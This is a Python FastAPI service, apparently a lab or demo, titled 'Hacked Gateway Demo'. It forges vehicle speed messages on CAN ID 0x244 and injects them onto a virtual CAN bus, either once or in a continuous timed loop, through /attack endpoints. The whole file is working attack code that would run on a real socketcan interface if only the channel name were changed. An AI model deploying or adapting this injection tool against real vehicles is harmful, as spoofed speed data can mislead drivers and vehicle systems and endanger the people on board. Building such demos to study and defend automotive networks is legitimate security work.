from fastapi import FastAPI, Query
import can, threading, time, logging

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger("gateway")

app = FastAPI(title="Hacked Gateway Demo (with sensor baseline)")

SPEED_CAN_ID = 0x244
SPEED_POS = 3
BUS = can.interface.Bus(channel="vcan0", bustype="socketcan")

def make_payload_kph(mph:int):
    if mph < 0: mph = 0
    if mph > 999: mph = 999
    kph = mph / 0.6213751
    kph100 = int(kph * 100)
    high = (kph100 >> 8) & 0xFF
    low  = kph100 & 0xFF
    data = [0]*8
    data[SPEED_POS] = high
    data[SPEED_POS+1] = low
    return bytes(data)

def send_can(payload: bytes):
    msg = can.Message(arbitration_id=SPEED_CAN_ID, data=payload, is_extended_id=False)
    BUS.send(msg)

@app.get("/attack/once")
def attack_once(speed: int = Query(..., ge=0, le=999)):
    payload = make_payload_kph(speed)
    try:
        send_can(payload)
    except Exception as e:
        logger.exception("send failed")
        return {"error": str(e)}
    return {"sent":{"id": hex(SPEED_CAN_ID), "data": payload.hex()}, "mode":"once"}

# continuous attack helper
_attack_thread = None
_attack_flag = threading.Event()

def _attack_loop(speed, interval, duration):
    payload = make_payload_kph(speed)
    end = time.time() + duration
    while time.time() < end and _attack_flag.is_set():
        try:
            send_can(payload)
        except Exception:
            logger.exception("send failed")
        time.sleep(interval)
    _attack_flag.clear()

@app.get("/attack/continuous")
def attack_continuous(speed: int = Query(..., ge=0, le=999),
                      duration: float = Query(5.0, ge=0.1, le=3600.0),
                      interval: float = Query(0.1, ge=0.01, le=5.0)):
    global _attack_thread
    if _attack_flag.is_set():
        return {"error":"another attack is running"}
    _attack_flag.set()
    _attack_thread = threading.Thread(target=_attack_loop, args=(speed, interval, duration), daemon=True)
    _attack_thread.start()
    return {"mode":"continuous", "speed": speed, "duration": duration, "interval": interval}

@app.get("/attack/stop")
def attack_stop():
    _attack_flag.clear()
    return {"stopped": True}

@app.get("/health")
def health():
    return {"status":"ok"}
